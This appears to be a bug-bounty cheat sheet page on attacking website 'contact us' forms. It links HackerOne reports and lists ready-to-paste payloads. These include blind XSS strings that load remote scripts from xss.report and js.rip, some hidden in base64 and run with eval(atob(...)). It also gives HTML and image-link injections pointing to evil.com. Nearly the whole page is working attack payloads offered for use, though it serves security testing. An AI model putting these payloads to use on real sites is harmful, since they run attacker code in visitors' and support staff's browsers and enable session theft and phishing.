# Contact us

* [**There is no rate limit for contact-us endpoints**](https://hackerone.com/reports/856305)
* [Blind XSS on image upload support chat](https://hackerone.com/reports/1010466)
*   **blind XSS**

    ```python
    "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8veHNzLnJlcG9ydC9zL004U1pUOCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>
    '"><script src=//xss.report/s/M8SZT8></script>
    "><script src="https://js.rip/l5j9hbki0b"></script>
    "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL2w1ajloYmtpMGIiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
    ```
*   **HTML injection**

    ```python
    <Https://evil.comxxxxxxxxxxxxxxxxxxxxeeeeeeeeeeaaaaaaaaaaaaa>%20%22<b>hello</b><h1>hacker</h1><a Href='abc.com'>xxxx</a>abc.comxxxxxxxxxxxxxxxxxxxxeeeeeeeeeeaaaaaaaaaaaaacxcccc
    ```
*   **img injection**

    ```python
     "/><img src="x"><a href="[https://evil.com](https://evil.com)">login</a>
    ```
